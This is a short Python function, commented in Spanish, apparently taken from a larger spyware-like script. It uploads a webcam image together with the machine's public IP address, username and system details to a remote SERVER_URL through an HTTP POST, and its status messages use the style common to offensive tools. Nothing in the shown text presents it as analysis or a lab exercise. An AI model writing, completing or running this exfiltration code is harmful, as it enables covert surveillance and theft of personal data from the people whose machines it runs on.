def enviar_al_servidor(info, archivos):
    try:
        # Depuración para ver qué tiene el diccionario info
        print("[*] Info a enviar:")
        print(f"IP Pública: {info['ip_publica']}")
        print(f"Usuario: {info['usuario']}")
        print(f"Sistema: {info['sistema']}")
        print(f"Info completa: {json.dumps(info, indent=2)}")
        
        with open(archivos["webcam"], "rb") as img:
            files = {
                "image": img,
                "ip": (None, info["ip_publica"]),
                "username": (None, info["usuario"]),
                "system_info": (None, json.dumps(info)),
            }
            response = requests.post(SERVER_URL, files=files)
            print("[+] Enviado al servidor:", response.status_code)
            print("[*] Respuesta del servidor:", response.text)
    except Exception as e:
        print(f"[!] Error enviando datos: {e}")

